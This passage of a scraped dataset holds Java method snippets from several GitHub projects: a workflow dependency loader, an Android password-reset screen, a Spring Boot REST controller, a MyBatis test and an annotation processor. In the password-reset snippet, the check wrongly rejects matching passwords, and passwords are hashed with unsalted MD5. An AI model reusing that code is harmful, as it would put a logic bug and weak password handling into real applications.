"https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34056, "method_name": "resolveDependencies", "class_name": "DirectoryFlowLoader", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resolveDependencies() {\n    // Add all the in edges and out edges. Catch bad dependencies and self\n    // referrals. Also collect list of nodes who are parents.\n    for (final Node node : this.nodeMap.values()) {\n      final Props props = this.jobPropsMap.get(node.getId());\n\n      if (props == null) {\n        this.logger.error(\"Job props not found!! For some reason.\");\n        continue;\n      }\n\n      final List<String> dependencyList =\n          props.getStringList(CommonJobProperties.DEPENDENCIES,\n              (List<String>) null);\n\n      if (dependencyList != null) {\n        Map<String, Edge> dependencies = this.nodeDependencies.get(node.getId());\n        if (dependencies == null) {\n          dependencies = new HashMap<>();\n\n          for (String dependencyName : dependencyList) {\n            dependencyName =\n                dependencyName == null ? null : dependencyName.trim();\n            if (dependencyName == null || dependencyName.isEmpty()) {\n              continue;\n            }\n\n            final Edge edge = new Edge(dependencyName, node.getId());\n            final Node dependencyNode = this.nodeMap.get(dependencyName);\n            if (dependencyNode == null) {\n              if (this.duplicateJobs.contains(dependencyName)) {\n                edge.setError(\"Ambiguous Dependency. Duplicates found.\");\n                dependencies.put(dependencyName, edge);\n                this.errors.add(node.getId() + \" \u4f9d\u8d56\u5173\u7cfb\u4e0d\u6e05\u6670 \"\n                    + dependencyName);\n              } else {\n                edge.setError(\"Dependency not found.\");\n                dependencies.put(dependencyName, edge);\n                this.errors.add(node.getId() + \" \u627e\u4e0d\u5230\u4f9d\u8d56 \"\n                    + dependencyName);\n              }\n            } else if (dependencyNode == node) {\n              // We have a self cycle\n              edge.setError(\"Self cycle found.\");\n              dependencies.put(dependencyName, edge);\n              this.errors.add(node.getId() + \" \u6709\u4e00\u4e2a\u6b7b\u5faa\u73af\");\n            } else {\n              dependencies.put(dependencyName, edge);\n            }\n          }\n\n          if (!dependencies.isEmpty()) {\n            this.nodeDependencies.put(node.getId(), dependencies);\n          }\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34057, "method_name": "buildFlowsFromDependencies", "class_name": "DirectoryFlowLoader", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void buildFlowsFromDependencies() {\n    // Find all root nodes by finding ones without dependents.\n    final HashSet<String> nonRootNodes = new HashSet<>();\n    for (final Map<String, Edge> edges : this.nodeDependencies.values()) {\n      for (final String sourceId : edges.keySet()) {\n        nonRootNodes.add(sourceId);\n      }\n    }\n\n    // Now create flows. Bad flows are marked invalid\n    for (final Node base : this.nodeMap.values()) {\n      // Root nodes can be discovered when parsing jobs\n      if (this.rootNodes.contains(base.getId())\n          || !nonRootNodes.contains(base.getId())) {\n        this.rootNodes.add(base.getId());\n        final Flow flow = new Flow(base.getId());\n        final Props jobProp = this.jobPropsMap.get(base.getId());\n\n        FlowLoaderUtils.addEmailPropsToFlow(flow, jobProp);\n\n        flow.addAllFlowProperties(this.flowPropsList);\n        final Set<String> visitedNodesOnPath = new HashSet<>();\n        final Set<String> visitedNodesEver = new HashSet<>();\n        constructFlow(flow, base, visitedNodesOnPath, visitedNodesEver);\n\n        flow.initialize();\n        this.flowMap.put(base.getId(), flow);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34058, "method_name": "constructFlow", "class_name": "DirectoryFlowLoader", "params": ["Flow", "Node", "Set<String>", "Set<String>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void constructFlow(final Flow flow, final Node node, final Set<String> visitedOnPath,\n      final Set<String> visitedEver) {\n    visitedOnPath.add(node.getId());\n    visitedEver.add(node.getId());\n\n    flow.addNode(node);\n    if (SpecialJobTypes.EMBEDDED_FLOW_TYPE.equals(node.getType())) {\n      final Props props = this.jobPropsMap.get(node.getId());\n      final String embeddedFlow = props.get(SpecialJobTypes.FLOW_NAME);\n\n      Set<String> embeddedFlows = this.flowDependencies.get(flow.getId());\n      if (embeddedFlows == null) {\n        embeddedFlows = new HashSet<>();\n        this.flowDependencies.put(flow.getId(), embeddedFlows);\n      }\n\n      node.setEmbeddedFlowId(embeddedFlow);\n      embeddedFlows.add(embeddedFlow);\n    }\n    final Map<String, Edge> dependencies = this.nodeDependencies.get(node.getId());\n\n    if (dependencies != null) {\n      for (Edge edge : dependencies.values()) {\n        if (edge.hasError()) {\n          flow.addEdge(edge);\n        } else if (visitedOnPath.contains(edge.getSourceId())) {\n          // We have a cycle. We set it as an error edge\n          edge = new Edge(edge.getSourceId(), node.getId());\n          edge.setError(\"Cyclical dependencies found.\");\n          this.errors.add(\"Cyclical dependency found at \" + edge.getId());\n          flow.addEdge(edge);\n        } else if (visitedEver.contains(edge.getSourceId())) {\n          // this node was already checked, don't need to check further\n          flow.addEdge(edge);\n        } else {\n          // This should not be null\n          flow.addEdge(edge);\n          final Node sourceNode = this.nodeMap.get(edge.getSourceId());\n          constructFlow(flow, sourceNode, visitedOnPath, visitedEver);\n        }\n      }\n    }\n\n    visitedOnPath.remove(node.getId());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34059, "method_name": "getNameWithoutExtension", "class_name": "DirectoryFlowLoader", "params": ["File"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String getNameWithoutExtension(final File file) {\n    final String filename = file.getName();\n    final int index = filename.lastIndexOf('.');\n\n    return index < 0 ? filename : filename.substring(0, index);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34060, "method_name": "getRelativeFilePath", "class_name": "DirectoryFlowLoader", "params": ["String", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String getRelativeFilePath(final String basePath, final String filePath) {\n    return filePath.substring(basePath.length() + 1);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/DirectoryFlowLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["FlowLoader"], "modifiers": ["public"]}}, {"id": 34061, "method_name": "getLayoutId", "class_name": "PasswordForgetActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayoutId() {\n        return R.layout.resetpwd_activity;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/PasswordForgetActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 34062, "method_name": "initView", "class_name": "PasswordForgetActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initView() {\n        InputTextHelper.with(this)\n                .addView(mPhoneView)\n                .addView(pwdEdit)\n                .addView(mCodeView)\n                .addView(repeatPwdEdit)\n                .setMain(mCommitView)\n                .setListener(helper -> mPhoneView.getText().toString().length() == 11)\n                .build();\n\n        setOnClickListener(R.id.resetBtn, R.id.toLogin, R.id.cv_register_countdown);\n        mPhoneView.addTextChangedListener(new TextWatcher() {\n\n            @Override\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n\n            }\n\n            @Override\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\n\n            }\n\n            @Override\n            public void afterTextChanged(Editable s) {\n                String code = mCodeView.getText().toString().trim();\n                String pwd = pwdEdit.getText().toString().trim();\n                String repeatpwd = repeatPwdEdit.getText().toString().trim();\n                if (s.toString().length() > 0 && code.length() > 0 && pwd.length() > 0 && repeatpwd.length() > 0) {\n                    mCommitView.setBackgroundResource(R.drawable.login_bg);\n                    mCommitView.setTextColor(Color.WHITE);\n                    mCommitView.setEnabled(true);\n                } else {\n                    mCommitView.setBackgroundResource(R.drawable.normal_bg);\n                    mCommitView.setTextColor(Color.WHITE);\n                    mCommitView.setEnabled(false);\n                }\n            }\n        });\n        pwdEdit.addTextChangedListener(new TextWatcher() {\n\n            @Override\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n\n            }\n\n            @Override\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\n\n            }\n\n            @Override\n            public void afterTextChanged(Editable s) {\n                String moblie = mPhoneView.getText().toString().trim();\n                String code = mCodeView.getText().toString().trim();\n                String repeatpwd = repeatPwdEdit.getText().toString().trim();\n                if (s.toString().length() > 0 && moblie.length() > 0 && code.length() > 0 && repeatpwd.length() > 0) {\n                    mCommitView.setBackgroundResource(R.drawable.login_bg);\n                    mCommitView.setTextColor(Color.WHITE);\n                    mCommitView.setEnabled(true);\n                } else {\n                    mCommitView.setBackgroundResource(R.drawable.normal_bg);\n                    mCommitView.setTextColor(Color.WHITE);\n                    mCommitView.setEnabled(false);\n                }\n            }\n        });\n        mCodeView.addTextChangedListener(new TextWatcher() {\n\n            @Override\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n\n            }\n\n            @Override\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\n\n            }\n\n            @Override\n            public void afterTextChanged(Editable s) {\n                String moblie = mPhoneView.getText().toString().trim();\n                String pwd = pwdEdit.getText().toString().trim();\n                String repeatpwd = repeatPwdEdit.getText().toString().trim();\n                if (s.toString().length() > 0 && moblie.length() > 0 && pwd.length() > 0 && repeatpwd.length() > 0) {\n                    mCommitView.setBackgroundResource(R.drawable.login_bg);\n                    mCommitView.setTextColor(Color.WHITE);\n                    mCommitView.setEnabled(true);\n                } else {\n                    mCommitView.setBackgroundResource(R.drawable.normal_bg);\n                    mCommitView.setTextColor(Color.WHITE);\n                    mCommitView.setEnabled(false);\n                }\n            }\n        });\n        repeatPwdEdit.addTextChangedListener(new TextWatcher() {\n\n            @Override\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n\n            }\n\n            @Override\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\n\n            }\n\n            @Override\n            public void afterTextChanged(Editable s) {\n                String moblie = mPhoneView.getText().toString().trim();\n                String pwd = pwdEdit.getText().toString().trim();\n                String code = mCodeView.getText().toString().trim();\n                if (s.toString().length() > 0 && moblie.length() > 0 && pwd.length() > 0 && code.length() > 0) {\n                    mCommitView.setBackgroundResource(R.drawable.login_bg);\n                    mCommitView.setTextColor(Color.WHITE);\n                    mCommitView.setEnabled(true);\n                } else {\n                    mCommitView.setBackgroundResource(R.drawable.normal_bg);\n                    mCommitView.setTextColor(Color.WHITE);\n                    mCommitView.setEnabled(false);\n                }\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/PasswordForgetActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 34063, "method_name": "initData", "class_name": "PasswordForgetActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData() {\n\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/PasswordForgetActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 34064, "method_name": "onClick", "class_name": "PasswordForgetActivity", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View v) {\n        switch (v.getId()) {\n            case R.id.cv_register_countdown:\n                // \u9a8c\u8bc1\u7801\u6821\u9a8c\n                if (mPhoneView.getText().toString().length() != 11) {\n                    toast(R.string.common_phone_input_error);\n                    return;\n                }\n                // \u83b7\u53d6\u9a8c\u8bc1\u7801\n                EasyHttp.post(this)\n                        .api(new GetCodeApi()\n                                .setPhone(mPhoneView.getText().toString())\n                                .setType(\"2\"))\n                        .request(new HttpCallback<HttpData<GetCode>>(this) {\n\n                            @Override\n                            public void onSucceed(HttpData<GetCode> getCode) {\n                                if (getCode != null) {\n                                    int code = getCode.getCode();\n                                    String message = getCode.getMessage();\n                                    if (code == 0) {\n                                        toast(R.string.common_code_send_hint);\n                                        mCountdownView.start();\n                                    }\n                                    if (!TextUtils.isEmpty(message)) {\n                                        toast(message);\n                                    }\n                                }\n                            }\n\n                            @Override\n                            public void onFail(Exception e) {\n                                super.onFail(e);\n                                toast(e.getMessage());\n                            }\n                        });\n                break;\n            case R.id.resetBtn:\n                //\u91cd\u7f6e\u5bc6\u7801\n                if (mPhoneView.getText().toString().length() != 11) {\n                    toast(R.string.common_phone_input_error);\n                    return;\n                }\n                // \u5224\u65ad\u65b0\u5bc6\u7801\u8f93\u5165\u662f\u5426\u4e00\u81f4\n                String pwd = pwdEdit.getText().toString().trim();\n                String repeatpwd = repeatPwdEdit.getText().toString().trim();\n                if (pwd.equals(repeatpwd)){\n                    toast(\"\u5bc6\u7801\u8f93\u5165\u4e0d\u4e00\u81f4\");\n                    return;\n                }\n                EasyHttp.post(this)\n                        .api(new RefoundApi()\n                                .setAccount(mPhoneView.getText().toString().trim())\n                                .setCode(mCodeView.getText().toString().trim())\n                                .setNewPwd(Md5Util.md5(pwdEdit.getText().toString().trim()))\n                                .setRepeatNewPwd(Md5Util.md5(repeatPwdEdit.getText().toString().trim())))\n                        .request(new HttpCallback<HttpData<Void>>(this) {\n\n                            @Override\n                            public void onSucceed(HttpData<Void> data) {\n                                finish();\n                            }\n\n                            @Override\n                            public void onFail(Exception e) {\n                                super.onFail(e);\n                                toast(e.getMessage());\n                            }\n                        });\n                break;\n            case R.id.toLogin:\n                // \u5df2\u6709\u8d26\u53f7\u53bb\u767b\u5f55\n                LoginActivity.start(getActivity(), mPhoneView.getText().toString(), pwdEdit.getText().toString());\n                setResult(RESULT_OK);\n                finish();\n                break;\n            default:\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/PasswordForgetActivity.java", "stars": "1", "class_props": {"extends": "MyActivity", "implements": null, "modifiers": ["final", "public"]}}, {"id": 34065, "method_name": "getAllTutorials", "class_name": "TutorialController", "params": ["String", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<Map>", "snippet": "  public ResponseEntity<Map<String, Object>> getAllTutorials(\n        @RequestParam(required = false) String title,\n        @RequestParam(defaultValue = \"0\") int page, \n        @RequestParam(defaultValue = \"3\") int size\n      ) {\n\n    try {\n      List<Tutorial> tutorials = new ArrayList<Tutorial>();\n      Pageable paging = PageRequest.of(page, size);\n      \n      Page<Tutorial> pageTuts;\n      if (title == null)\n        pageTuts = tutorialRepository.findAll(paging);\n      else\n        pageTuts = tutorialRepository.findByTitleContaining(title, paging);\n\n      tutorials = pageTuts.getContent();\n\n      if (tutorials.isEmpty()) {\n        return new ResponseEntity<>(HttpStatus.NO_CONTENT);\n      }\n\n      Map<String, Object> response = new HashMap<>();\n      response.put(\"tutorials\", tutorials);\n      response.put(\"currentPage\", pageTuts.getNumber());\n      response.put(\"totalItems\", pageTuts.getTotalElements());\n      response.put(\"totalPages\", pageTuts.getTotalPages());\n\n      return new ResponseEntity<>(response, HttpStatus.OK);\n    } catch (Exception e) {\n      return new ResponseEntity<>(null, HttpStatus.INTERNAL_SERVER_ERROR);\n    }\n  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-jpa-paging-sorting/master/src/main/java/com/bezkoder/spring/data/jpa/pagingsorting/controller/TutorialController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34066, "method_name": "findByPublished", "class_name": "TutorialController", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<Map>", "snippet": "  public ResponseEntity<Map<String, Object>> findByPublished(\n        @RequestParam(defaultValue = \"0\") int page, \n        @RequestParam(defaultValue = \"3\") int size\n      ) {\n    try {      \n      List<Tutorial> tutorials = new ArrayList<Tutorial>();\n      Pageable paging = PageRequest.of(page, size);\n      \n      Page<Tutorial> pageTuts = tutorialRepository.findByPublished(true, paging);\n      tutorials = pageTuts.getContent();\n      \n      if (tutorials.isEmpty()) {\n        return new ResponseEntity<>(HttpStatus.NO_CONTENT);\n      }\n      \n      Map<String, Object> response = new HashMap<>();\n      response.put(\"tutorials\", tutorials);\n      response.put(\"currentPage\", pageTuts.getNumber());\n      response.put(\"totalItems\", pageTuts.getTotalElements());\n      response.put(\"totalPages\", pageTuts.getTotalPages());\n      \n      return new ResponseEntity<>(response, HttpStatus.OK);\n    } catch (Exception e) {\n      return new ResponseEntity<>(HttpStatus.EXPECTATION_FAILED);\n    }\n  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-jpa-paging-sorting/master/src/main/java/com/bezkoder/spring/data/jpa/pagingsorting/controller/TutorialController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34067, "method_name": "getTutorialById", "class_name": "TutorialController", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<Tutorial>", "snippet": "  public ResponseEntity<Tutorial> getTutorialById(@PathVariable(\"id\") long id) {\n    Optional<Tutorial> tutorialData = tutorialRepository.findById(id);\n\n    if (tutorialData.isPresent()) {\n      return new ResponseEntity<>(tutorialData.get(), HttpStatus.OK);\n    } else {\n      return new ResponseEntity<>(HttpStatus.NOT_FOUND);\n    }\n  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-jpa-paging-sorting/master/src/main/java/com/bezkoder/spring/data/jpa/pagingsorting/controller/TutorialController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34068, "method_name": "createTutorial", "class_name": "TutorialController", "params": ["Tutorial"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<Tutorial>", "snippet": "  public ResponseEntity<Tutorial> createTutorial(@RequestBody Tutorial tutorial) {\n    try {\n      Tutorial _tutorial = tutorialRepository.save(new Tutorial(tutorial.getTitle(), tutorial.getDescription(), false));\n      return new ResponseEntity<>(_tutorial, HttpStatus.CREATED);\n    } catch (Exception e) {\n      return new ResponseEntity<>(null, HttpStatus.EXPECTATION_FAILED);\n    }\n  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-jpa-paging-sorting/master/src/main/java/com/bezkoder/spring/data/jpa/pagingsorting/controller/TutorialController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34069, "method_name": "updateTutorial", "class_name": "TutorialController", "params": ["long", "Tutorial"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<Tutorial>", "snippet": "  public ResponseEntity<Tutorial> updateTutorial(@PathVariable(\"id\") long id, @RequestBody Tutorial tutorial) {\n    Optional<Tutorial> tutorialData = tutorialRepository.findById(id);\n\n    if (tutorialData.isPresent()) {\n      Tutorial _tutorial = tutorialData.get();\n      _tutorial.setTitle(tutorial.getTitle());\n      _tutorial.setDescription(tutorial.getDescription());\n      _tutorial.setPublished(tutorial.isPublished());\n      return new ResponseEntity<>(tutorialRepository.save(_tutorial), HttpStatus.OK);\n    } else {\n      return new ResponseEntity<>(HttpStatus.NOT_FOUND);\n    }\n  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-jpa-paging-sorting/master/src/main/java/com/bezkoder/spring/data/jpa/pagingsorting/controller/TutorialController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34070, "method_name": "deleteTutorial", "class_name": "TutorialController", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<HttpStatus>", "snippet": "  public ResponseEntity<HttpStatus> deleteTutorial(@PathVariable(\"id\") long id) {\n    try {\n      tutorialRepository.deleteById(id);\n      return new ResponseEntity<>(HttpStatus.NO_CONTENT);\n    } catch (Exception e) {\n      return new ResponseEntity<>(HttpStatus.EXPECTATION_FAILED);\n    }\n  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-jpa-paging-sorting/master/src/main/java/com/bezkoder/spring/data/jpa/pagingsorting/controller/TutorialController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34071, "method_name": "deleteAllTutorials", "class_name": "TutorialController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ResponseEntity<HttpStatus>", "snippet": "  public ResponseEntity<HttpStatus> deleteAllTutorials() {\n    try {\n      tutorialRepository.deleteAll();\n      return new ResponseEntity<>(HttpStatus.NO_CONTENT);\n    } catch (Exception e) {\n      return new ResponseEntity<>(HttpStatus.EXPECTATION_FAILED);\n    }\n\n  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-jpa-paging-sorting/master/src/main/java/com/bezkoder/spring/data/jpa/pagingsorting/controller/TutorialController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34072, "method_name": "setUp", "class_name": "AssociationTypeTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    // create a SqlSessionFactory\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/associationtype/mybatis-config.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n\n    // populate in-memory database\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/associationtype/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/associationtype/AssociationTypeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34073, "method_name": "shouldGetAUser", "class_name": "AssociationTypeTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUser() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      List<Map> results = sqlSession.selectList(\"getUser\");\n      for (Map r : results) {\n        Assertions.assertEquals(String.class, r.get(\"a1\").getClass());\n        Assertions.assertEquals(String.class, r.get(\"a2\").getClass());\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/associationtype/AssociationTypeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34074, "method_name": "getAppUser", "class_name": "UserExecUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAppUser() {\n        return appUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/auth/domain/UserExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34075, "method_name": "setAppUser", "class_name": "UserExecUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAppUser(String appUser) {\n        this.appUser = appUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/auth/domain/UserExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34076, "method_name": "getExecUser", "class_name": "UserExecUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getExecUser() {\n        return execUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/auth/domain/UserExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34077, "method_name": "setExecUser", "class_name": "UserExecUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecUser(String execUser) {\n        this.execUser = execUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/auth/domain/UserExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34078, "method_name": "init", "class_name": "StarDriverProcessor", "params": ["ProcessingEnvironment"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "void", "snippet": "    public synchronized void init(ProcessingEnvironment processingEnv) {\n        super.init(processingEnv);\n        mMessager = processingEnv.getMessager();\n        mElementUtils = processingEnv.getElementUtils();\n    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/stardriver-apt-processor/src/main/java/org/succlz123/stardriver/StarDriverProcessor.java", "stars": "4", "class_props": {"extends": "AbstractProcessor", "implements": null, "modifiers": ["public"]}}, {"id": 34079, "method_name": "getSupportedAnnotationTypes", "class_name": "StarDriverProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "    public Set<String> getSupportedAnnotationTypes() {\n        HashSet<String> supportTypes = new LinkedHashSet<>();\n        supportTypes.add(StarDriverInit.class.getCanonicalName());\n        return supportTypes;\n    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/stardriver-apt-processor/src/main/java/org/succlz123/stardriver/StarDriverProcessor.java", "stars": "4", "class_props": {"extends": "AbstractProcessor", "implements": null, "modifiers": ["public"]}}, {"id": 34080, "method_name": "getSupportedSourceVersion", "class_name": "StarDriverProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SourceVersion", "snippet": "    public SourceVersion getSupportedSourceVersion() {\n        return SourceVersion.latestSupported();\n    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/stardriver-apt-processor/src/main/java/org/succlz123/stardriver/StarDriverProcessor.java", "stars": "4", "class_props": {"extends": "AbstractProcessor", "implements": null, "modifiers": ["public"]}}, {"id": 34081, "method_name": "process", "class_name": "StarDriverProcessor", "params": ["Set<TypeElement>", "RoundEnvironment"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean process(Set<? extends TypeElement> set, RoundEnvironment roundEnvironment) {\n        long startTime = System.currentTimeMillis();\n        Set<? extends Element> elements = roundEnvironment.getElementsAnnotatedWith(StarDriverInit.class);\n        if (elements != null && !elements.isEmpty()) {\n            mMessager.printMessage(Diagnostic.Kind.NOTE, TAG + \" -> processing\");\n            mNodeHashMap.clear();\n            for (Element element : elements) {\n                String fullName = element.asType().toString();\n                ProcessClassNode proxy = mNodeHashMap.get(fullName);\n                if (proxy == null) {\n                    proxy = new ProcessClassNode(new ClassParameter(mElementUtils, element));\n                    mNodeHashMap.put(fullName, proxy);\n                }\n            }\n            try {\n                JavaFile javaFile = JavaFile.builder(PACKAGE_NAME, generateManagerCode()).build();\n                javaFile.writeTo(processingEnv.getFiler());\n            } catch (Exception e) {\n                mMessager.printMessage(Diagnostic.Kind.ERROR, TAG + \" -> process error \" + e);\n            }\n            double cost = (System.currentTimeMillis() - startTime) / 1000d;\n            mMessager.printMessage(Diagnostic.Kind.NOTE, TAG + \" -> process finish cost time: \" + cost + \"s\");\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/stardriver-apt-processor/src/main/java/org/succlz123/stardriver/StarDriverProcessor.java", "stars": "4", "class_props": {"extends": "AbstractProcessor", "implements": null, "modifiers": ["public"]}}, {"id": 34082, "method_name": "generateManagerCode", "class_name": "StarDriverProcessor", "params": [], "throws": null, "modifiers": ["private"], "return_type": "TypeSpec", "snippet": "    private TypeSpec generateManagerCode() {\n        return TypeSpec.classBuilder(\"StarDriverManager\")\n                .addModifiers(Modifier.PUBLIC)\n                .addJavadoc(\"This Java file is automatically generated by \" + TAG + \", PLEASE DO NOT EDIT!\")\n                .addMethod(generateMethods())\n                .build();\n    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/stardriver-apt-processor/src/main/java/org/succlz123/stardriver/StarDriverProcessor.java", "stars": "4", "class_props": {"extends": "AbstractProcessor", "implements": null, "modifiers": ["public"]}}, {"id": 34083, "method_name": "generateMethods", "class_name": "StarDriverProcessor", "params": [], "throws": null, "modifiers": ["private"], "return_type": "MethodSpec", "snippet": "    private MethodSpec generateMethods() {\n        ClassName host = ClassName.get(\"android.app\", \"Application\");\n        String packageName = this.getClass().getPackage().getName();\n        ClassName result = ClassName.get(packageName, \"StarDriverStatistics\");\n        ClassName arrayList = ClassName.get(ArrayList.class);\n        ParameterizedTypeName returnType = ParameterizedTypeName.get(arrayList, result);\n        MethodSpec.Builder methodBuilder = MethodSpec.methodBuilder(\"inject\")\n                .addModifiers(Modifier.PUBLIC, Modifier.STATIC)\n                .returns(returnType)\n                .addParameter(host, \"context\");\n        methodBuilder.beginControlFlow(\"if (context == null)\")\n                .addStatement(\"throw new IllegalStateException(\\\"The application is null\\\")\")\n                .endControlFlow();\n        methodBuilder.addStatement(\"$T<$T> resultList = new $T<>()\", ArrayList.class, result, ArrayList.class);\n\n        Set<Map.Entry<String, ProcessClassNode>> entries = mNodeHashMap.entrySet();\n        for (Map.Entry<String, ProcessClassNode> entry : entries) {\n            ProcessClassNode currentNode = entry.getValue();\n            ClassParameter currentParameter = entry.getValue().value;\n            // 